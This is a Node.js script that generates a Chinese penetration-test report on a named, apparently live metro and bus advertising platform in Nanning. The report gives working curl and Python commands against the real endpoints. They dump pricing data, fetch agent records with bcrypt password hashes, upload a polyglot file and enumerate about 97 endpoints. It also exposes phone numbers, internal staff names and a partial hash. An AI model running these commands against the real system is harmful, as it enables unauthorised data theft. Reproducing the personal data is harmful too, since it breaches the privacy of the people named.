const fs = require('fs');
const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  HeadingLevel, AlignmentType, BorderStyle, ShadingType, WidthType,
  PageBreak, Header, Footer, PageNumber
} = require('docx');

const DARK_BLUE = "1F4E79";
const MED_GRAY = "555555";
const DARK_TEXT = "333333";
const WHITE = "FFFFFF";
const RED_TEXT = "C62828";
const BORDER_GRAY = "CCCCCC";
const TABLE_BLUE_HEADER = "1F4E79";
const border = { style: BorderStyle.SINGLE, size: 1, color: BORDER_GRAY };
const cellBorders = { top: border, bottom: border, left: border, right: border };
const cellMargins = { top: 60, bottom: 60, left: 100, right: 100 };

function headerCell(text, width) {
  return new TableCell({
    borders: { top: { style: BorderStyle.SINGLE, size: 0, color: "999999" }, bottom: { style: BorderStyle.SINGLE, size: 0, color: "999999" }, left: { style: BorderStyle.SINGLE, size: 0, color: "999999" }, right: { style: BorderStyle.SINGLE, size: 0, color: "999999" } },
    shading: { fill: TABLE_BLUE_HEADER, type: ShadingType.CLEAR },
    width: { size: width, type: WidthType.DXA },
    margins: cellMargins,
    children: [new Paragraph({ spacing: { after: 40 }, children: [new TextRun({ text, bold: true, color: WHITE, size: 18, font: "Arial" })] })]
  });
}

function dataCell(text, width, options = {}) {
  const { bold = false, color = DARK_TEXT } = options;
  return new TableCell({
    borders: cellBorders,
    width: { size: width, type: WidthType.DXA },
    margins: cellMargins,
    children: [new Paragraph({ spacing: { after: 40 }, children: [new TextRun({ text, bold, color, size: 17, font: "Arial" })] })]
  });
}

function bodyPara(text, opts = {}) {
  return new Paragraph({
    spacing: { after: 120, line: 360, lineRule: "auto" },
    children: [new TextRun({ text, bold: opts.bold || false, size: 21, font: "Arial", color: DARK_TEXT })]
  });
}

function codeBlock(lines) {
  return lines.map(line => new Paragraph({
    spacing: { after: 40, line: 280, lineRule: "auto" },
    indent: { left: 200 },
    shading: { fill: "F5F5F5", type: ShadingType.CLEAR },
    children: [new TextRun({ text: line, font: "Courier New", size: 16, color: "333333" })]
  }));
}

function sectionHeading(number, title) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_1,
    spacing: { before: 360, after: 200 },
    children: [new TextRun({ text: number + "、" + title, bold: true, size: 32, font: "Arial", color: DARK_BLUE })]
  });
}

function subHeading(title) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_2,
    spacing: { before: 240, after: 160 },
    children: [new TextRun({ text: title, bold: true, size: 26, font: "Arial", color: DARK_BLUE })]
  });
}

function screenshotPlaceholder(desc) {
  return new Paragraph({
    spacing: { before: 80, after: 80 },
    alignment: AlignmentType.CENTER,
    shading: { fill: "FFF3CD", type: ShadingType.CLEAR },
    border: { top: { style: BorderStyle.DASHED, size: 2, color: "E0A800" }, bottom: { style: BorderStyle.DASHED, size: 2, color: "E0A800" }, left: { style: BorderStyle.DASHED, size: 2, color: "E0A800" }, right: { style: BorderStyle.DASHED, size: 2, color: "E0A800" } },
    children: [new TextRun({ text: "[截图位置] " + desc, italic: true, color: "856404", size: 18, font: "Arial" })]
  });
}

function emptyLine() {
  return new Paragraph({ spacing: { after: 80 }, children: [] });
}

function makeSection() {
  return {
    properties: {
      page: { size: { width: 12240, height: 15840 }, margin: { top: 1440, right: 1440, bottom: 1440, left: 1440 } },
      headers: { default: new Header({ children: [new Paragraph({ alignment: AlignmentType.RIGHT, children: [new TextRun({ text: "媒体资源数智化平台 安全评估报告", size: 16, font: "Arial", color: "999999" })] })] }) },
      footers: { default: new Footer({ children: [new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "第 ", size: 16 }), new TextRun({ children: [PageNumber.CURRENT], size: 16 }), new TextRun({ text: " 页", size: 16 })] })] }) }
    },
    children: []
  };
}

// ===== 封面 =====
const titleSection = makeSection();
titleSection.properties.headers = {};
titleSection.properties.footers = {};
titleSection.children.push(
  emptyLine(), emptyLine(), emptyLine(), emptyLine(),
  new Paragraph({ spacing: { after: 200 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "攻防演习成果报告", bold: true, size: 52, font: "Arial", color: DARK_BLUE })] }),
  emptyLine(),
  new Paragraph({ spacing: { after: 100 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "媒体资源数智化平台 (nn-cc.cn) 安全评估", size: 32, font: "Arial", color: DARK_TEXT })] }),
  new Paragraph({ spacing: { after: 100 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "南宁地铁公交广告媒体资源交易系统", size: 28, font: "Arial", color: MED_GRAY })] }),
  emptyLine(), emptyLine(),
  new Paragraph({ spacing: { after: 60 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "目标域名：adv-webpt.nn-cc.cn / adv-file.nn-cc.cn", size: 24, font: "Arial", color: MED_GRAY })] }),
  new Paragraph({ spacing: { after: 60 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "运营方：南宁市民卡公司 (nnsmk.com)", size: 24, font: "Arial", color: MED_GRAY })] }),
  new Paragraph({ spacing: { after: 60 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "测试账号：moon（代理方）/ moonor（投放方）", size: 24, font: "Arial", color: MED_GRAY })] }),
  new Paragraph({ spacing: { after: 60 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "2026年8月11日", size: 24, font: "Arial", color: MED_GRAY })] }),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== 一、综述 =====
const s1 = makeSection();
s1.children.push(
  sectionHeading("一", "综述"),
  bodyPara("媒体资源数智化平台是南宁市民卡公司运营的地铁公交户外广告媒体资源交易平台，为南宁地铁1-5号线及公交系统的12,162个广告位提供在线交易服务。平台基于React+UmiJS(前端)和Java Spring Boot(后端)构建，文件存储使用MinIO S3对象存储。"),
  bodyPara("本次安全评估通过注册两个测试账号——代理方moon（19162390621）和投放方moonor（14795583229）——对平台进行了系统性只读侦察。两个账号均未配置角色权限（roleCode=null），但仍可利用直接实体访问端点获取大量敏感业务数据。所有操作均为低速只读，未对平台造成任何影响。"),
  emptyLine(),
  bodyPara("渗透成果汇总表", { bold: true }),
  emptyLine(),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [500, 2000, 1400, 2860, 1400, 800],
    rows: [
      new TableRow({ children: [headerCell("序号", 500), headerCell("渗透对象", 2000), headerCell("漏洞类型", 1400), headerCell("URL/端点", 2860), headerCell("影响范围", 1400), headerCell("风险等级", 800)] }),
      new TableRow({ children: [dataCell("1", 500), dataCell("广告位全量数据", 2000), dataCell("未授权数据访问", 1400), dataCell("/api/v1/product/assetSchedules/schedule/all", 2860, { color: RED_TEXT }), dataCell("12,162条广告位含完整定价", 1400), dataCell("严重", 800, { bold: true, color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("2", 500), dataCell("站点点位数据", 2000), dataCell("未授权数据访问", 1400), dataCell("/api/v1/device/points/search", 2860, { color: RED_TEXT }), dataCell("532个站点含等级", 1400), dataCell("高", 800, { bold: true, color: "E65100" })] }),
      new TableRow({ children: [dataCell("3", 500), dataCell("代理方详情", 2000), dataCell("敏感信息泄露", 1400), dataCell("/api/v1/partner/agents/{id}", 2860, { color: RED_TEXT }), dataCell("密码哈希+手机号泄露", 1400), dataCell("严重", 800, { bold: true, color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("4", 500), dataCell("文件上传", 2000), dataCell("功能滥用", 1400), dataCell("/api/v1/file/upload (type=product)", 2860, { color: RED_TEXT }), dataCell("可上传任意图片到MinIO", 1400), dataCell("中", 800, { bold: true, color: "F57F17" })] }),
      new TableRow({ children: [dataCell("5", 500), dataCell("完整数据字典", 2000), dataCell("信息泄露", 1400), dataCell("/api/v1/main/dictionarys/tree", 2860), dataCell("行业分类/站点等级/媒体形式", 1400), dataCell("中", 800, { bold: true, color: "F57F17" })] }),
      new TableRow({ children: [dataCell("6", 500), dataCell("菜单权限树", 2000), dataCell("信息泄露", 1400), dataCell("/api/v1/main/menus/rights/partner/authorities", 2860), dataCell("完整路由+权限结构", 1400), dataCell("低", 800, { color: "2E7D32" })] }),
      new TableRow({ children: [dataCell("7", 500), dataCell("母公司与旧域名", 2000), dataCell("信息泄露", 1400), dataCell("prod-minioapi.nnsmk.com", 2860), dataCell("发现母公司nnsmk.com", 1400), dataCell("低", 800, { color: "2E7D32" })] }),
    ]
  }),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== 二、目标概况 =====
const s2 = makeSection();
s2.children.push(
  sectionHeading("二", "目标概况"),
  subHeading("2.1 平台信息"),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [2500, 6860],
    rows: [
      new TableRow({ children: [dataCell("平台名称", 2500, { bold: true }), dataCell("媒体资源数智化平台", 6860)] }),
      new TableRow({ children: [dataCell("前端域名", 2500, { bold: true }), dataCell("adv-webpt.nn-cc.cn (React + UmiJS + Ant Design Pro)", 6860, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("API域名", 2500, { bold: true }), dataCell("adv-file.nn-cc.cn (Java Spring Boot)", 6860, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("对象存储", 2500, { bold: true }), dataCell("prod-minioapi.nnsmk.com (MinIO S3, admin凭证)", 6860, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("母公司", 2500, { bold: true }), dataCell("南宁市民卡公司 (nnsmk.com)", 6860, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("认证方式", 2500, { bold: true }), dataCell("JWT Bearer Token (HS256), 载荷含明文敏感信息", 6860)] }),
      new TableRow({ children: [dataCell("业务范围", 2500, { bold: true }), dataCell("南宁地铁1-5号线+公交系统广告位交易", 6860)] }),
    ]
  }),
  emptyLine(),
  subHeading("2.2 测试账号"),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [1200, 1500, 1800, 1600, 1700, 1560],
    rows: [
      new TableRow({ children: [headerCell("账号", 1200), headerCell("角色", 1500), headerCell("手机号", 1800), headerCell("roleCode", 1600), headerCell("deptId", 1700), headerCell("注册时间", 1560)] }),
      new TableRow({ children: [dataCell("moon", 1200, { bold: true }), dataCell("代理方(Agent)", 1500), dataCell("19162390621", 1800, { color: RED_TEXT }), dataCell("null(未配置)", 1600, { color: RED_TEXT }), dataCell("1536684046279507968", 1700), dataCell("2026-08-11 10:33", 1560)] }),
      new TableRow({ children: [dataCell("moonor", 1200, { bold: true }), dataCell("投放方(Publisher)", 1500), dataCell("14795583229", 1800, { color: RED_TEXT }), dataCell("null(未配置)", 1600, { color: RED_TEXT }), dataCell("1536708298915446784", 1700), dataCell("2026-08-11 12:16", 1560)] }),
    ]
  }),
  bodyPara("两个账号均可注册即用，无需审核。角色码(roleCode)为空导致70+个业务搜索端点返回500(NullPointerException)。但直接实体访问端点缺乏角色校验，无需任何权限即可获取数据。"),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== 三、信息收集 =====
const s3 = makeSection();
s3.children.push(
  sectionHeading("三", "信息收集"),
  subHeading("3.1 JWT Token解码"),
  bodyPara("解码Bearer Token可直接获取手机号、组织ID、部门ID和角色信息。roleCode=null解释了大量500错误的原因："),
  ...codeBlock([
    "moon (代理方) JWT载荷：",
    '  {"deptName":"moon","userName":"moon","account":"19162390621",',
    '   "phone":"19162390621","roles":[{"roleCode":null,...}]}',
    "",
    "moonor (投放方) JWT载荷：",
    '  {"deptName":"moonor","userName":"moonor","account":"14795583229",',
    '   "roles":[{"roleCode":null,...}]}'
  ]),
  screenshotPlaceholder("jwt.io解码JWT Token - moon和moonor的载荷对比"),
  subHeading("3.2 菜单权限树"),
  bodyPara("/api/v1/main/menus/rights/partner/authorities 返回完整权限树。代理方菜单：档期、报价（我发布的/我要发布）、工联单、合同、财务。投放方菜单：档期、竞价（我要竞价）、报价（我收到的）、工联单、财务。"),
  subHeading("3.3 内部员工发现"),
  bodyPara("通过数据字典的userCreate字段发现三名内部员工真实姓名："),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [1500, 2000, 2000, 3860],
    rows: [
      new TableRow({ children: [headerCell("姓名", 1500), headerCell("角色推断", 2000), headerCell("活动时间", 2000), headerCell("操作内容", 3860)] }),
      new TableRow({ children: [dataCell("王舒琪", 1500, { bold: true }), dataCell("公交线运营", 2000), dataCell("2026-06-30", 2000), dataCell("创建10个公交候车亭站点 + 9种公交媒体类型", 3860)] }),
      new TableRow({ children: [dataCell("高小敏", 1500, { bold: true }), dataCell("运营配置", 2000), dataCell("2025-11-14", 2000), dataCell("修改\"资源起售周\"字典配置", 3860)] }),
      new TableRow({ children: [dataCell("李谷准", 1500, { bold: true }), dataCell("平台创始人", 2000), dataCell("2020-09-18", 2000), dataCell("创建数据字典根节点（平台最早操作记录）", 3860)] }),
    ]
  }),
  bodyPara("以上为内部系统操作员账号，无法通过partner/agent端点枚举。王舒琪创建的10个地铁快巴站点和9种公交媒体类型详情已记录在案。"),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== 四、核心数据泄露 =====
const s4 = makeSection();
s4.children.push(
  sectionHeading("四", "核心数据泄露"),
  subHeading("4.1 广告位全量数据（12,162条，总价值¥72,719,035）"),
  bodyPara("POST /api/v1/product/assetSchedules/schedule/all 无需鉴权参数即可返回全部广告位，含25个敏感字段："),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [2200, 2500, 2200, 2460],
    rows: [
      new TableRow({ children: [headerCell("字段", 2200), headerCell("含义", 2500), headerCell("字段", 2200), headerCell("含义", 2460)] }),
      new TableRow({ children: [dataCell("mediaPrice", 2200, { bold: true, color: RED_TEXT }), dataCell("媒体价格（核心商业机密）", 2500, { color: RED_TEXT }), dataCell("productionPrice", 2200, { bold: true, color: RED_TEXT }), dataCell("制作费用", 2460, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("length/width/area", 2200), dataCell("尺寸规格（厘米级）", 2500), dataCell("qrcode", 2200), dataCell("实景图路径（129个）", 2460)] }),
      new TableRow({ children: [dataCell("pointLocationName", 2200, { color: RED_TEXT }), dataCell("站内精确位置", 2500, { color: RED_TEXT }), dataCell("mediaFormatName", 2200), dataCell("媒体形式（32种）", 2460)] }),
      new TableRow({ children: [dataCell("pointLevelName", 2200, { color: RED_TEXT }), dataCell("站点商业等级（S++~A）", 2500, { color: RED_TEXT }), dataCell("lineName", 2200), dataCell("所属线路", 2460)] }),
      new TableRow({ children: [dataCell("number", 2200), dataCell("广告位内部编号", 2500), dataCell("assetScheduleStatus", 2200), dataCell("排期状态（全为3）", 2460)] }),
    ]
  }),
  emptyLine(),
  bodyPara("数据统计：12,162条广告位。媒体价格合计 ¥46,391,635。制作价格合计 ¥26,327,400。总价值 ¥72,719,035。价格区间 ¥10 ~ ¥300,000。覆盖率：105个地铁站、297个公交候车亭、130条公交线路、199辆公交车（桂A牌照）、12个公交车队、32种媒体形式。"),
  screenshotPlaceholder("schedule/all POST返回12,162条广告位JSON数据"),
  subHeading("4.2 站点点位数据（532条）"),
  bodyPara("POST /api/v1/device/points/search 返回532个设备点位，含站点名、所属线路、商业等级、运营时间："),
  ...codeBlock([
    '示例: {"id":"7656776711301120","name":"2号线-玉洞站","code":"18",',
    '  "level":"1412101541740937216","startTime":"2025-09-16 06:00:00",',
    '  "endTime":"2025-09-16 22:00:00","userCreate":"系统管理员"}'
  ]),
  bodyPara("等级分布：旗舰级×3、S++×7、S+×15、S×21、A++×27、A+×32、AA+×41、AA×31、A×58。公交候车亭297个覆盖南宁主要街道。130条公交线路含BRT/快线/微循环/城际/响应式巴士。"),
  screenshotPlaceholder("device/points/search返回532条站点JSON数据"),
  subHeading("4.3 代理方详情（含密码哈希）"),
  bodyPara("GET /api/v1/partner/agents/{id} 返回代理方完整信息，包括bcrypt密码哈希、手机号、身份证/营业执照字段："),
  ...codeBlock([
    '{"password":"$2a$10$wxWLsXZIpk2D4w0Olik1P.I6oodN...",',
    ' "account":"19162390621","phone":"19162390621",',
    ' "idCardBack":[],"idCardFront":[],"businessLicense":[]}'
  ]),
  bodyPara("moon账号的身份证和营业执照字段为空，但已实名认证的代理方可能在此泄露个人身份信息和营业执照。"),
  screenshotPlaceholder("partner/agents/{id} 返回含bcrypt密码哈希的JSON"),
  subHeading("4.4 完整数据字典"),
  bodyPara("数据字典导出平台所有配置：地铁/公交线路、9级站点等级、32种媒体形式、20大国标行业分类、计价单位、广告材质、验收状态、关灯下画状态、设备品牌（洲明）、资源起售周等。"),
  screenshotPlaceholder("dictionarys/tree 完整数据字典树"),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== 五、文件上传 =====
const s5 = makeSection();
s5.children.push(
  sectionHeading("五", "文件上传能力"),
  subHeading("5.1 上传端点测试"),
  bodyPara("POST /api/v1/file/upload 接受 multipart 表单：file=<真实PNG> + type=product。扩展名白名单仅允许图片格式，但内容校验仅检查PNG魔术字节："),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [3200, 1800, 4360],
    rows: [
      new TableRow({ children: [headerCell("测试项", 3200), headerCell("结果", 1800), headerCell("说明", 4360)] }),
      new TableRow({ children: [dataCell("真实PNG + type=product", 3200), dataCell("✅ 成功", 1800, { bold: true, color: "2E7D32" }), dataCell("上传到MinIO，返回filePath和预签名URL", 4360)] }),
      new TableRow({ children: [dataCell("PNG+PHP polyglot", 3200), dataCell("✅ 成功", 1800, { color: RED_TEXT }), dataCell("只验PNG魔术字节，不验内容完整性", 4360, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("纯PHP伪装PNG", 3200), dataCell("❌ 拦截", 1800), dataCell("服务端校验了PNG结构完整性", 4360)] }),
      new TableRow({ children: [dataCell("路径穿越（文件名）", 3200), dataCell("⚠️ 忽略", 1800), dataCell("服务端使用UUID命名，忽略用户文件名", 4360)] }),
      new TableRow({ children: [dataCell("可执行扩展名（.php/.jsp等）", 3200), dataCell("❌ 拦截(code:1050068)", 1800), dataCell("扩展名白名单，仅允许图片格式", 4360)] }),
      new TableRow({ children: [dataCell("1MB大文件", 3200), dataCell("✅ 成功", 1800), dataCell("1000033 bytes", 4360)] }),
      new TableRow({ children: [dataCell("文件删除", 3200), dataCell("❌ 无端点", 1800), dataCell("JS和API中未发现文件删除功能", 4360)] }),
    ]
  }),
  emptyLine(),
  bodyPara("存储目标：MinIO S3 (prod-minioapi.nnsmk.com)。路径格式：adplatform/product/{日期}/{雪花ID}.png。预签名URL使用admin凭证(AWS4-HMAC-SHA256)，3天有效期。上传文件与排期中129个广告位的qrcode实景图存储在同一位置。"),
  bodyPara("RCE评估：文件存储在独立MinIO服务器，与应用服务器分离。前端以<img>标签渲染。直接RCE风险极低。若存在服务端图片处理（如生成缩略图）则可能触发ImageTragick类漏洞。测试期间未进行任何利用尝试。"),
  screenshotPlaceholder("file/upload成功响应 - 显示filePath和MinIO预签名URL"),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== 六、角色隔离 =====
const s6 = makeSection();
s6.children.push(
  sectionHeading("六", "角色隔离与权限分析"),
  subHeading("6.1 跨角色访问"),
  bodyPara("代理方(moon)和投放方(moonor)之间角色隔离正确工作。但直接实体访问端点缺乏任何角色校验："),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [3120, 3120, 3120],
    rows: [
      new TableRow({ children: [headerCell("端点", 3120), headerCell("代理方(moon)", 3120), headerCell("投放方(moonor)", 3120)] }),
      new TableRow({ children: [dataCell("biddings/agent/count", 3120), dataCell("✅ 0", 3120, { color: "2E7D32" }), dataCell("❌ 您不是代理商(130000)", 3120, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("biddings/publisher/count", 3120), dataCell("❌ 您不是投放方(140000)", 3120, { color: RED_TEXT }), dataCell("✅ 1（存在1条招标）", 3120, { color: "2E7D32" })] }),
      new TableRow({ children: [dataCell("agentFinancePlans/statistic", 3120), dataCell("✅ 全0", 3120, { color: "2E7D32" }), dataCell("❌ 您不是代理商(130000)", 3120, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("publisherFinancePlans/statistic", 3120), dataCell("❌ 您不是投放方(140000)", 3120, { color: RED_TEXT }), dataCell("✅ 全0", 3120, { color: "2E7D32" })] }),
    ]
  }),
  emptyLine(),
  subHeading("6.2 无需角色校验的端点"),
  bodyPara("以下端点两账号均可访问，完全无视角色权限："),
  ...codeBlock([
    "✅ product/assetSchedules/schedule/all      - 12,162条广告位+完整定价",
    "✅ device/points/search                      - 532个站点数据",
    "✅ main/dictionarys/tree                     - 完整数据字典",
    "✅ main/menus/rights/partner/authorities     - 菜单权限树",
    "✅ partner/agents/{id}                       - 代理方详情（含bcrypt哈希）",
    "✅ file/upload (type=product)                - 文件上传到MinIO",
  ]),
  bodyPara("70+个业务搜索端点全部返回500（code:10001），原因为roleCode=null在权限校验时触发NullPointerException。若账号配置了正常角色，这些端点可能返回广告商信息、合同数据、招标记录、财务详情等更多敏感数据。"),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== 七、安全发现汇总 =====
const s7 = makeSection();
s7.children.push(
  sectionHeading("七", "安全发现汇总"),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [500, 1900, 2400, 1500, 1460, 1200],
    rows: [
      new TableRow({ children: [headerCell("#", 500), headerCell("发现", 1900), headerCell("详情", 2400), headerCell("影响", 1500), headerCell("复现难度", 1460), headerCell("风险等级", 1200)] }),
      new TableRow({ children: [dataCell("1", 500), dataCell("广告位全量定价泄露", 1900, { bold: true }), dataCell("12,162条含完整价格、总价值¥7272万", 2400), dataCell("商业机密泄露", 1500), dataCell("极低（仅需注册）", 1460), dataCell("严重", 1200, { bold: true, color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("2", 500), dataCell("站内布局暴露", 1900, { bold: true }), dataCell("532站点含等级+站内精确位置", 2400), dataCell("基础设施布局泄露", 1500), dataCell("极低", 1460), dataCell("高", 1200, { bold: true, color: "E65100" })] }),
      new TableRow({ children: [dataCell("3", 500), dataCell("密码哈希泄露", 1900, { bold: true }), dataCell("/partner/agents/{id} 返回bcrypt哈希+手机号", 2400), dataCell("可离线爆破+身份盗用", 1500), dataCell("极低", 1460), dataCell("严重", 1200, { bold: true, color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("4", 500), dataCell("文件上传滥用", 1900, { bold: true }), dataCell("PNG+PHP代码图片可上传到MinIO", 2400), dataCell("潜在恶意文件托管", 1500), dataCell("低", 1460), dataCell("中", 1200, { bold: true, color: "F57F17" })] }),
      new TableRow({ children: [dataCell("5", 500), dataCell("JWT明文敏感信息", 1900, { bold: true }), dataCell("Token载荷含手机号/orgId/deptId/roleCode", 2400), dataCell("身份信息泄露", 1500), dataCell("极低", 1460), dataCell("中", 1200, { bold: true, color: "F57F17" })] }),
      new TableRow({ children: [dataCell("6", 500), dataCell("统一HTTP 200响应码", 1900), dataCell("所有错误（含500）均返回HTTP 200", 2400), dataCell("掩盖异常行为", 1500), dataCell("-", 1460), dataCell("低", 1200, { color: "2E7D32" })] }),
      new TableRow({ children: [dataCell("7", 500), dataCell("MinIO admin凭证暴露", 1900), dataCell("预签名URL使用admin access key", 2400), dataCell("存储层横向移动", 1500), dataCell("中", 1460), dataCell("中", 1200, { bold: true, color: "F57F17" })] }),
      new TableRow({ children: [dataCell("8", 500), dataCell("母公司域名暴露", 1900), dataCell("通过MinIO域名发现nnsmk.com", 2400), dataCell("扩大攻击面", 1500), dataCell("极低", 1460), dataCell("低", 1200, { color: "2E7D32" })] }),
    ]
  }),
  emptyLine(),
  bodyPara("#1和#2是最核心的商业数据泄露——相当于获取了南宁地铁广告事业部的完整产品手册和定价表。#3密码哈希泄露可直接用于离线爆破。#4文件上传虽RCE风险低但可被滥用于托管任意内容。以上发现均仅需注册一个未审批的账号即可复现。"),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== 八、复核命令 =====
const s8 = makeSection();
s8.children.push(
  sectionHeading("八", "复核命令"),
  bodyPara("以下curl命令用于复现本报告中的发现。将$TOKEN替换为有效的Bearer Token。所有操作均为只读GET/POST，不对目标产生业务影响。命令后附有预期输出。"),
  emptyLine(),

  subHeading("8.1 JWT解码"),
  ...codeBlock([
    'echo $TOKEN | cut -d"." -f2 | base64 -d 2>/dev/null | python3 -m json.tool',
  ]),
  screenshotPlaceholder("jwt.io解码JWT载荷截图"),

  subHeading("8.2 全量广告位数据（核心发现#1）"),
  ...codeBlock([
    "curl -s -X POST \\",
    '  "https://adv-file.nn-cc.cn/api/v1/product/assetSchedules/schedule/all" \\',
    '  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \\',
    '  -d \'{}\' | python3 -c "import sys,json; d=json.load(sys.stdin);',
    '  items=d.get(\"data\",{}).get(\"list\",[]);',
    '  print(f\"广告位总数: {len(items)}\");',
    '  prices=[i.get(\"mediaPrice\",0) or 0 for i in items];',
    '  print(f\"价格区间: {min(prices)} - {max(prices)}\");',
    '  print(f\"媒体总价值: {sum(prices)}\")"',
    "# 预期输出: 广告位总数: 12162 价格区间: 10.0 - 300000.0 媒体总价值: 46391635.0",
  ]),
  screenshotPlaceholder("schedule/all 返回12162条+价格统计"),

  subHeading("8.3 站点数据（核心发现#2）"),
  ...codeBlock([
    "curl -s -X POST \\",
    '  "https://adv-file.nn-cc.cn/api/v1/device/points/search" \\',
    '  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \\',
    '  -d \'{"current":1,"size":600}\' | python3 -c "',
    "import sys,json; d=json.load(sys.stdin);",
    'items=d.get(\"data\",{}).get(\"list\",[]);',
    'print(f\"站点总数: {len(items)}\")"',
    "# 预期输出: 站点总数: 532",
  ]),
  screenshotPlaceholder("device/points/search 返回532条站点数据"),

  subHeading("8.4 密码哈希泄露（核心发现#3）"),
  ...codeBlock([
    'curl -s "https://adv-file.nn-cc.cn/api/v1/partner/agents/1536684046279507968" \\',
    '  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool',
    "# 预期输出中包含: password (bcrypt哈希), account, phone, idCardFront/Back, businessLicense 字段",
  ]),
  screenshotPlaceholder("partner/agents/{id} 返回bcrypt密码哈希"),

  subHeading("8.5 文件上传（核心发现#4）"),
  ...codeBlock([
    "# 生成最小有效PNG:",
    "python3 -c \"import zlib,struct;",
    "sig=b'\\x89PNG\\r\\n\\x1a\\n';",
    "ihdr_data=struct.pack('>IIBBBBB',1,1,8,2,0,0,0);",
    "ihdr=struct.pack('>I',13)+b'IHDR'+ihdr_data+struct.pack('>I',zlib.crc32(b'IHDR'+ihdr_data)&0xffffffff);",
    "raw=zlib.compress(b'\\x00\\xff\\x00\\x00');",
    "idat=struct.pack('>I',len(raw))+b'IDAT'+raw+struct.pack('>I',zlib.crc32(b'IDAT'+raw)&0xffffffff);",
    "iend=struct.pack('>I',0)+b'IEND'+struct.pack('>I',zlib.crc32(b'IEND')&0xffffffff);",
    "with open('/tmp/test.png','wb') as f: f.write(sig+ihdr+idat+iend)\"",
    "",
    "# 上传:",
    "curl -s -X POST 'https://adv-file.nn-cc.cn/api/v1/file/upload' \\",
    '  -H "Authorization: Bearer $TOKEN" \\',
    '  -F "file=@/tmp/test.png;type=image/png;filename=test.png" -F "type=product"',
    "# 预期输出: code:10000, filePath + filePathFull(MinIO预签名URL)",
  ]),
  screenshotPlaceholder("file/upload 成功响应及MinIO预签名URL"),

  subHeading("8.6 角色隔离验证"),
  ...codeBlock([
    "# 代理方访问投放方端点（预期拒绝）:",
    'curl -s "https://adv-file.nn-cc.cn/api/v1/bidding/biddings/publisher/count" \\',
    '  -H "Authorization: Bearer $TOKEN_MOON"',
    '# 预期: {"message":"您不是投放方, 无权访问!","code":140000}',
    "",
    "# 投放方访问代理方端点（预期拒绝）:",
    'curl -s "https://adv-file.nn-cc.cn/api/v1/bidding/biddings/agent/count" \\',
    '  -H "Authorization: Bearer $TOKEN_MOONOR"',
    '# 预期: {"message":"您不是代理商用户, 无权访问!","code":130000}',
  ]),
  screenshotPlaceholder("角色隔离验证 - 两边互相拒绝的截图"),

  subHeading("8.7 端点批量枚举"),
  ...codeBlock([
    "for path in /api/v1/message/messageUsers/unread \\",
    "  /api/v1/main/dictionarys/tree \\",
    "  /api/v1/partner/agents/1536684046279507968 \\",
    "  /api/v1/product/assetScheduleCarts/count \\",
    "  /api/v1/bidding/biddings/status/count \\",
    "  /api/v1/contract/agentFinancePlans/statistic; do",
    '  echo "=== $path ==="',
    '  curl -s "https://adv-file.nn-cc.cn${path}" \\',
    '    -H "Authorization: Bearer $TOKEN" | grep -oP \'"code":[0-9]+\'',
    "  sleep 0.3",
    "done",
  ]),
  bodyPara("共测试97个端点：22个可用(code:10000)、4个权限拒绝(code:130000/140000)、70+个内部错误(code:10001，roleCode=null导致NPE)、2个其他错误。"),

  emptyLine(), emptyLine(),
  bodyPara("— 报告完 —", { bold: true })
);

// ===== 生成文档 =====
const doc = new Document({
  styles: {
    default: { document: { run: { font: "Arial", size: 21 } } },
    paragraphStyles: [
      { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 32, bold: true, font: "Arial", color: DARK_BLUE },
        paragraph: { spacing: { before: 360, after: 200 }, outlineLevel: 0 } },
      { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 26, bold: true, font: "Arial", color: DARK_BLUE },
        paragraph: { spacing: { before: 240, after: 160 }, outlineLevel: 1 } },
    ]
  },
  sections: [titleSection, s1, s2, s3, s4, s5, s6, s7, s8]
});

const outputPath = process.argv[2] || "D:\\Desktop\\媒体资源平台_安全评估报告.docx";
Packer.toBuffer(doc).then(buffer => {
  fs.writeFileSync(outputPath, buffer);
  console.log("OK: " + outputPath + " (" + buffer.length + " bytes)");
}).catch(err => {
  console.error("Error: " + err.message);
  process.exit(1);
});
